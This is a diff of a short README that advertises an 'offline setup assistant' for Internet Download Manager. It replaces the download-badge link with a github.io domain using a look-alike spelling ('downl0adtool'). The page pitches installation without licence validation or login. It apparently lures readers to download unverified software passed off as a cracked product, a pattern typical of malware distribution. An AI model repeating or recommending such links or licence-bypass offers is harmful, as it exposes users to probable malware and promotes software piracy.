@@ -1,6 +1,6 @@
 # Internet Download Manager — Offline Setup Assistant
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://internet-download-manager-pro.github.io/.github)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://managerpro-internet-downl0adtool.github.io/.github/)
 
 Internet Download Manager (IDM) is a powerful tool that accelerates downloads, supports browser integration, and manages large files with ease. This assistant enables offline installation without requiring online validation or login.
 
